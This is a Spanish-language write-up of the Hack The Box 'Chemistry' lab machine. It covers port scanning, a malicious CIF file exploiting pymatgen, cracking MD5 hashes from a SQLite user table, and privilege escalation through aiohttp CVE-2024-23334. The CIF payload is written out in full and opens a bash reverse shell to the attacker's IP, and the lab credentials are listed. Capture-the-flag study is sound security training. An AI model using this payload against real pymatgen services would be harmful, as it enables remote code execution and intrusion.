
# Chemistry
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Chemistry.png" alt="Chemistry" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>Malicious CIF File (RCE)</li>
        <li>SQLite Database File Enumeration</li>
        <li>Cracking Hashes</li>
        <li>aiohttp/3.9.1 Exploitation (CVE-2024.23334) [Privilege Escalation]</li>
      </ul>
    </td>
  </tr>
</table>

## Enumeracion básica
Realizamos una enumeración básica de todos los puertos y  comprobar cuáles estan abiertos y lo exportamos al fichero `allports`.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.38 -oG allports

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

```
Vamos a realizar un escaneo más exaustivo de los siguiente puertos encontrados:

```shell
nmap -sCV -p22,5000 10.10.11.38 -oN targeted
```

Se puede comprobar que no encontramos nada interesante o vulnerable.

```shell
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5

```

## Comprobamos la página web

Si examinamos la página web, podemos ver que usa la tecnología Werkzeug httpd 3.0.3 (Python 3.9.5). Cuando accedemos a la página web, vemos que es una página relacionada con subir ficheros CIF.

```shell
whatweb http://10.10.11.38:5000
http://10.10.11.38:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```
Si buscamos información sobre ficheros CIF, encontramos que la librería Pymatgen tiene una vulnerabilidad de ejecución remota de código (RCE) al parsear ficheros CIF maliciosos.

El siguiente enlace hay un ejemplo de un fichero CIF malicioso que explota esta vulnerabilidad:
```shell
https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
```
Adaptamos el fichero CIF malicioso para que nos haga una reverse shell a nuestra máquina por el puerto 4444.

```shell
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.24/4444 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

## Intrusión

Una vez que nos conectamos a la máquina víctima podemos ver que tenemos una shell como el usuario `app`, si nos dirigimos al home del usuario `app` podemos ver que tenemos un fichero llamado `instance` y dentro de este un fichero llamado `database.db`.

```shell
app@chemistry:~/instance$ ls
database.db
```

Si examinamos el fichero `database.db` podemos ver que es una base de datos SQLite.

```shell
app@chemistry:~/instance$ file database.db 
database.db: SQLite 3.x database, last written using SQLite version 3031001
```

Si accedemos a la base de datos podemos ver que hay una tabla llamada `user` con varios usuarios y sus hashes.

```shell
app@chemistry:~/instance$ sqlite3 database.db
```

El usuario que nos llama la atención es el usuario `rosa`.Ya que existe un directorio en el home del usuario `rosa` y contiene la flag.

```shell
sqlite> select * from user ;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|fer|fbc4fef99cdd459c958f92ef36c9fe2b
```
Si intentamos crackear el hash del usuario `rosa` con `hashcat` podemos ver que es un hash MD5 usando `crackstation`.
podemos comprobar que la contraseña del usuario `rosa` es `unicorniosrosados`.

```shell
3ed86ee9f624c7b14f1d4f43dc251a5	--> unicorniosrosados
```

Por lo tanto podemos hacer un ssh al usuario `rosa` y obtener la flag de user.


## Escalar privilegios

Si hacemos un `sudo -l` podemos ver que el usuario `rosa` no tiene permisos de sudo, si buscamos alguna vulnerabiilidad de los permisos SUID podemos ver que no hay nada interesante. Y tampoco hay tareas programadas en el crontab ni capabilities especiales.

Si examinamos los puertos abiertos en la máquina víctima podemos ver que el puerto 8080 está abierto y escuchando en localhost.

```shell
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1076/python3.9      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

Realizamos un túnel SSH para redirigir el puerto 8080 a nuestra máquina local y así poder acceder a la aplicación web que está escuchando en ese puerto.

```shell
ssh -L 8080:127.0.0.1:8080 rosa@chemistry.htb
```

Si lanzamos `whatweb` contra el puerto 8080 podemos ver que está corriendo un servidor web basado en `aiohttp/3.9.1`.

```shell
whatweb http://127.0.0.1:8080/       
http://127.0.0.1:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[127.0.0.1], JQuery[3.6.0], Script, Title[Site Monitoring]  
```

Buscamos vulnerabilidades en `aiohttp` y encontramos la vulnerabilidad CVE-2024-23334 que permite la ejecución remota de código (RCE) en versiones anteriores a la 3.9.2.
por lo tanto podemos aprovechar esta vulnerabilidad para escalar privilegios a root. y obtener la flag de root.

```shell
https://github.com/TheRedP4nther/LFI-aiohttp-CVE-2024-23334-PoC
```